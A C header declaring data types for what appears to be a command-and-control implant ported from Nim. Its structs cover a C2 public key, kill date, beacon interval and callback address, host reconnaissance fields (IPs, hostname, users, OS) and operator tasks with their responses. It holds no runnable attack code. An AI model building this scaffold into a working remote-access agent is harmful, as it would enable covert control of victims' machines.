#ifndef SINDARIN_TYPES_H
#define SINDARIN_TYPES_H

#include <stdint.h>
#include <stddef.h>

// Basic cryptographic types compatible with Nim's enkodo
typedef struct {
    uint8_t data[32];
} Key;

typedef struct {
    uint8_t data[24];
} Nonce;

typedef struct {
    uint8_t data[16];
} Mac;

// Encryption object compatible with Nim's EncObj
typedef struct {
    Key publicKey;
    Nonce nonce;
    Mac mac;
    int64_t cipherLen;
    uint8_t* cipherText;
} EncObj;

// Encrypted configuration compatible with Nim's EncConfig
typedef struct {
    Key privKey;
    Key pubKey;
    EncObj encObj;
} EncConfig;

// Static configuration compatible with Nim's StaticConfig
typedef struct {
    char* buildID;
    char* deploymentID;
    Key c2PubKey;
    int32_t killEpoch;
    int32_t interval;
    char* callback;
} StaticConfig;

// Status object compatible with Nim's Status
typedef struct {
    char* ip;
    char* externalIP;
    char* hostname;
    char* os;
    char* arch;
    char* users;
    int64_t bootTime;
} Status;

// Callback object compatible with Nim's Callback
typedef struct {
    StaticConfig* config;
    Status* status;
} Callback;

// Task object compatible with Nim's Task
typedef struct {
    char* taskId;
    int taskNum;
    int retrieved;  // boolean
    int complete;   // boolean
    char* arg;
    char* resp;
} Task;

// Response object compatible with Nim's Resp
typedef struct {
    char* taskId;
    char* resp;
} Resp;

// Helper functions for memory management
void free_enc_obj(EncObj* obj);
void free_enc_config(EncConfig* config);
void free_static_config(StaticConfig* config);
void free_status(Status* status);
void free_callback(Callback* callback);
void free_task(Task* task);
void free_resp(Resp* resp);

// Helper function for string copying
char* copy_string(const char* src);

#endif // SINDARIN_TYPES_H